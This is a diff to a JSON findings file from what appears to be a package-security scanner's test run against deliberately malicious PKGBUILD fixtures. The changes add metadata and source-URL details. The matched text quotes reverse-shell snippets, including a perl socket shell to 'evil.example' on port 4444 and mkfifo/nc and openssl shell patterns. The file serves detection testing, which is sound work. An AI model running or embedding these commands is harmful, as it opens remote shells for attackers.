@@ -18,7 +18,8 @@
       "cwe_id": "CWE-200",
       "metadata": {
         "in_install_script": true,
-        "matched_text": "| nc "
+        "matched_text": "| nc ",
+        "script_kind": "install script"
       }
     },
     {
@@ -37,7 +38,8 @@
       "cwe_id": "CWE-94",
       "metadata": {
         "in_install_script": true,
-        "matched_text": "perl -e 'use Socket;$i=\"evil.example\";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(4444,inet_aton($i)));exec(\"/bin/sh"
+        "matched_text": "perl -e 'use Socket;$i=\"evil.example\";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(4444,inet_aton($i)));exec(\"/bin/sh",
+        "script_kind": "install script"
       }
     },
     {
@@ -56,7 +58,8 @@
       "cwe_id": "CWE-94",
       "metadata": {
         "in_install_script": true,
-        "matched_text": "openssl s_client -quiet -connect"
+        "matched_text": "openssl s_client -quiet -connect",
+        "script_kind": "install script"
       }
     },
     {
@@ -75,7 +78,8 @@
       "cwe_id": "CWE-94",
       "metadata": {
         "in_install_script": true,
-        "matched_text": "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc "
+        "matched_text": "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ",
+        "script_kind": "install script"
       }
     },
     {
@@ -83,17 +87,23 @@
       "severity": "high",
       "category": "cryptography",
       "title": "All non-VCS sources use SKIP checksum",
-      "description": "No integrity verification is performed on 1 non-VCS source(s)",
+      "description": "No integrity verification is performed on 1 non-VCS source(s): https://example.com/n-${pkgver}.tar.gz",
       "location": {
         "file": "tests/fixtures/malicious/reverse-shell-variants/PKGBUILD",
         "line": null,
         "column": null,
-        "snippet": null
+        "snippet": "source: https://example.com/n-${pkgver}.tar.gz"
       },
       "recommendation": "Provide real checksums for non-VCS sources",
       "cwe_id": "CWE-354",
       "metadata": {
         "non_vcs_source_count": 1,
+        "unverified_indices": [
+          0
+        ],
+        "unverified_sources": [
+          "https://example.com/n-${pkgver}.tar.gz"
+        ],
         "vcs_source_count": 0
       }
     }
@@ -102,6 +112,6 @@
     "tests/fixtures/malicious/reverse-shell-variants/PKGBUILD",
     "tests/fixtures/malicious/reverse-shell-variants/netutil-bin.install"
   ],
-  "timestamp": "2026-06-15T13:48:50.303171897Z",
-  "scan_duration_ms": 7
+  "timestamp": "2026-11-10T14:51:07.550719483Z",
+  "scan_duration_ms": 29
 }
